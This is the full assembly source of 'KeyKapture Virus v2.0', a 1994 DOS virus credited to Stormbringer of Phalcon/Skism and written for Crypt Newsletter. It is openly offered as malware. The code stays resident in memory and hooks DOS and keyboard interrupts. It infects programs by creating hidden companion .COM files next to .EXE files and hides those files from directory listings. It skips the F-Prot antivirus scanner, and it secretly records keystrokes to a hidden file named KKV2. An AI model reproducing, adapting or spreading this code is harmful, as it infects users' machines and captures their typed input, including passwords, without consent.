;                           KeyKapture Virus v2.0
;                  (c) 1994 by Stormbringer [Phalcon/Skism]
;
;          This virus was written exclusively for Crypt Newsletter.
;
;  This virus is designed to aid in the capture of keystrokes on machines.
;It is probably best suited for a network environment - if it can be executed
;under root priveledges once, it will become _very_ effective.  It can capture
;up to 1k of keystrokes before it must be allowed to dump.  Dumping will be
;attempted when a disk change command is issued - strokes will be saved in
;a hidden file called KKV2 in the current directory on the new drive (if 
;possible).  Some of the code was taken from Hellspawn - all known bugs
;have been fixed.


.model tiny
.radix 16
.code
        org 100
start:
;;;;;;;;;;;;;;;;;;;;;;;;;;;;[Installation Routine];;;;;;;;;;;;;;;;;;;;;;;;;;;
AllocateMemory:
        mov     bx,(end_prog-start+1024d)/10
        mov     ah,4ah
        int     21

        mov     ah,48h
        mov     bx,40*3
        int     21

SetOwnerShip:
        sub     ax,10
        mov     es,ax
        mov     word ptr es:[0f1],08

CopyVirus:        
        mov     di,100
        mov     cx,end_prog-start
        mov     si,100
        repnz   movsb

SetStealth:
        mov     word ptr es:[LetterPTR],offset keystrokes
        mov     byte ptr es:[StealthOn],1

SetInterrupt21:
        push    es
        pop     ds
        
        mov     ax,3521
        int     21

        mov     [IP_21],bx
        mov     [CS_21],es

        mov     dx,offset Int21
        mov     ah,25
        int     21

        mov     ax,3509
        int     21

        mov     [IP_09],bx
        mov     [CS_09],es

        mov     dx,offset Int09
        mov     ah,25
        int     21

        
RunOriginalProgram:
        push    cs
        pop     es
        mov     ax,es:[2c]
        mov     ds,ax
        xor     si,si

FindPath:        
        lodsw
        or      ax,ax
        je      FoundPath
        dec     si
        jmp     FindPath

FoundPath:        
        lodsw

ChangeFilenameToEXE:
        mov     di,si
        mov     cx,80
FindEOF:       
        lodsb
        or      al,al
        jne     FindEOF
        mov     word ptr ds:[si-4],'XE'
        mov     byte ptr ds:[si-2],'E'
        
        mov     cx,si
        sub     cx,di
        dec     cx
        mov     si,di
        mov     di,offset Filename
        mov     al,cl
        add     al,es:[80]
        stosb
        repnz   movsb

SetCommandLine:
        push    cs
        pop     ds
        mov     si,81
        mov     cl,ds:[80]
        or      cl,cl
        jz      SkipCommandLine
        repnz   movsb
        
SkipCommandLine:
        mov     byte ptr es:[di],0dh
        mov     si,offset Filename
        int     2e
        mov     ax,4c00
        int     21
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;[End Installation];;;;;;;;;;;;;;;;;;;;;;;;;;;;;;



;;;;;;;;;;;;;;;;;;;;;;;;;;;;;[Int 21h Handler];;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
Int21:
        push    bp
        
        push    ax bx cx dx es ds si di
        push    cs cs
        pop     es ds
        cld
        mov     si,offset FunctionList
        mov     cx,EndList-FunctionList
        
FindByte:        
        lodsb
        cmp     ah,al
        je      FoundByte
        loop    FindByte

FoundByte:
        jcxz    ExitHandler
        mov     bp,EndList-FunctionList
        sub     bp,cx
        shl     bp,1
        add     bp,offset HandlerList
        pop     di si ds es dx cx bx ax
        call    word ptr cs:[bp]
        jmp     short GoInt21

ExitHandler:
        pop     di si ds es dx cx bx ax
GoInt21:
        pop     bp
        db      0ea
IP_21   dw      0
CS_21   dw      0


FakeInt21:
        pushf
        call    dword ptr cs:[IP_21]
        ret

FunctionList:
        db      0,0e,11,12,3dh,4bh,4c,4e,4f,6c
EndList:

HandlerList:
        dw      offset Terminate
        dw      offset DumpKey
        dw      Offset FCBFind
        dw      Offset FCBFind
        dw      Offset OpenHandle
        dw      Offset Execute
        dw      Offset Terminate
        dw      Offset FindHandle
        dw      Offset FindHandle
        dw      offset NewOpen

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;[Infection Handlers];;;;;;;;;;;;;;;;;;;;;;;;;;

Terminate:
        mov     byte ptr cs:[StealthOn],1
        ret

OpenHandle:
        push    ax bx cx dx es ds si di
   GenericOpen:        
        call    CheckName
        jc      NotEXE
        call    InfectFile
NotEXE:
        pop     di si ds es dx cx bx ax
        ret

Execute:
        push    si ax
        mov     si,dx

FindEOFN:        
        lodsb
        or      al,al
        jnz     FindEOFN

        cmp     word ptr ds:[si-9],'DK'
        je      ChkDsk
        cmp     word ptr ds:[si-0a],'P-'
        je      Fprot
        pop     ax si
        jmp     OpenHandle
ChkDsk:
        mov     byte ptr cs:[StealthOn],0
FProt:
        pop     ax si
        ret

NewOpen:
        push    ax bx cx dx es ds si di
        mov     dx,si
        jmp     short GenericOpen

CheckName:
        push    ds si ax
        mov     si,dx
   FindZeroInName:        
        lodsb
        or      al,al
        jnz     FindZeroInName
        
        cmp     word ptr [si-4],'XE'
        jne     BadName
        cmp     byte ptr [si-2],'E'
        jne     BadName
        cmp     word ptr ds:[si-0a],'P-'        ;is probably F-prot
        je      BadName

    GoodName:
        clc
        jmp     short ReturnName
    BadName:
        stc
    ReturnName:
        pop     ax si ds
        ret
        
InfectFile:
        call    SetCritical
        push    cs
        pop     es
        mov     si,dx
        mov     di,offset Filename

CopyFilename:        
        lodsb
        stosb
        or      al,al
        jnz     CopyFilename

        push    cs
        pop     ds

        mov     word ptr [di-4],'OC'
        mov     byte ptr [di-2],'M'


CreateVirus:
        mov     ah,3c
        mov     cx,2
        mov     dx,offset Filename
        call    fakeint21
        jc      ErrorCreate

WriteVirus:        
        xchg    bx,ax
        mov     ah,40
        mov     cx,end_prog-start
        mov     dx,100
        call    fakeint21

CloseVirus:
        mov     ah,3e
        call    fakeint21

ErrorCreate:
        call    ResetCritical
        ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;[Stealth Handlers];;;;;;;;;;;;;;;;;;;;;;;;;;;;;
FCBFind:
        cmp     byte ptr cs:[StealthOn],1
        je      StealthIsOn
        ret
StealthIsOn:
        call    FakeInt21
        cmp     al,0ff
        je      ErrorFF
Stealth:
        push    ax bx cx dx es ds si di
        mov     ah,2f
        call    FakeInt21

        cmp     byte ptr es:[bx],0ff
        jne     NotExtended
        add     bx,7
NotExtended:
        cmp     word ptr [bx+9],'OC'
        jne     DoneFF
        cmp     byte ptr [bx+0bh],'M'
        jne     DoneFF
        cmp     word ptr [bx+1dh],end_prog-start
        jne     DoneFF

FindNextFile:                
        pop     di si ds es dx cx bx ax
        mov     ah,12
        jmp     FCBFind

DoneFF:
        pop     di si ds es dx cx bx ax
        add     sp,2
        pop     bp
        retf    2

ErrorFF:
        mov     al,0ff
        add     sp,2
        pop     bp
        iret
        

FindHandle:
        pushf
        call    dword ptr cs:[IP_21]
        jc      ErrorHandleCall

        push    ax bx cx dx es ds si di
GetDTA:        
        mov     ah,2f
        call    FakeInt21

        cmp     word ptr es:[bx+1a],end_prog-start       ;Check size
        jne     EndHandle

        mov     ah,byte ptr es:[bx+15]
        and     ah,2
        jz      Endhandle
        
        pop     di si ds es dx cx bx ax
        
        mov     ah,4f
        jmp     FindHandle

EndHandle:
        pop     di si ds es dx cx bx ax
DoneHandleStealth:
        add     sp,2
        pop     bp
        clc
        retf    02

ErrorHandleCall:
        add     sp,2
        pop     bp
        mov     ah,12
        stc
        retf    02

;;;;;;;;;;;;;;;;;;;;;;;;;;[End of Int 21h Handler];;;;;;;;;;;;;;;;;;;;;;;;;;;


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;[Keyboard Handler];;;;;;;;;;;;;;;;;;;;;;;;;;;
Int09:
        pushf
        call    dword ptr cs:[IP_09]

        push    ax bx cx dx si di es ds
        push    cs cs
        pop     es ds
        
        xor     bx,bx
        mov     ah,1            ;Check if chars are waiting
        int     16
        jz      No_Char
        
        mov     di,word ptr cs:[LetterPTR]
        cmp     di,offset endkeys
        jae     No_Char
        
        cmp     al,1ah                  ;Avoid EOF marks...
        je      No_Char

        stosb
        inc     word ptr cs:[LetterPTR]
        cmp     al,0dh
        jne     No_Char

        mov     al,0ah
        stosb
        inc     word ptr cs:[LetterPTR]
No_Char:        
        pop     ds es di si dx cx bx ax
        iret


DumpKey:
        pushf
        call    dword ptr cs:[IP_21]
        jc      DoneDump
        call    SetCritical
        push    ax bx cx dx es ds si di
        push    cs cs
        pop     es ds
        mov     ax,3d02
        mov     dx,offset Keyfile
        call    fakeint21
        jnc     FileThere
        mov     ah,3c
        mov     dx,offset Keyfile
        mov     cx,2
        call    fakeint21
        jc      DoneSave
FileThere:
        xchg    bx,ax
        mov     ax,4202
        xor     cx,cx
        xor     dx,dx
        call    fakeint21
        mov     dx,offset keystrokes
        mov     cx,letterptr
        sub     cx,dx
        mov     ah,40
        int     21
        mov     ah,3e
        int     21

        mov     word ptr [LetterPTR],offset keystrokes
DoneSave:
        pop     di si ds es dx cx bx ax
        call    ResetCritical
        clc
DoneDump:
        add     sp,2
        pop     bp
        retf 2


SetCritical:
        push    ax bx ds
        xor     ax,ax
        mov     ds,ax
        mov     ax,offset CriticalHandler
        mov     bx,cs
        cli
        xchg    ds:[24*4],ax
        xchg    ds:[24*4+2],bx
        mov     word ptr cs:[CS_24],bx
        mov     word ptr cs:[IP_24],ax
        sti
        pop     ds bx ax
        ret

ResetCritical:
        push    ax bx ds
        xor     ax,ax
        mov     ds,ax
        mov     ax,word ptr cs:[IP_24]
        mov     bx,word ptr cs:[CS_24]
        cli
        mov     word ptr ds:[24*4],ax
        mov     word ptr ds:[24*4+2],bx
        sti
        pop     ds bx ax
        ret

CriticalHandler:
        mov     al,3
        iret

keyFile    db      'KKV2',0

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;[End Keyboard Handler];;;;;;;;;;;;;;;;;;;;;;;;;;;
Credits db      'KeyKapture Virus v2.0 (c) 1994 by Stormbringer [P/S]'

end_prog:

IP_09           dw      ?
CS_09           dw      ?
IP_24           dw      ?
CS_24           dw      ?
StealthOn       db      ?
LetterPTR       dw      ?
Filename        db      60 dup(?)
keystrokes      db      400 dup(?)
endkeys:
end start
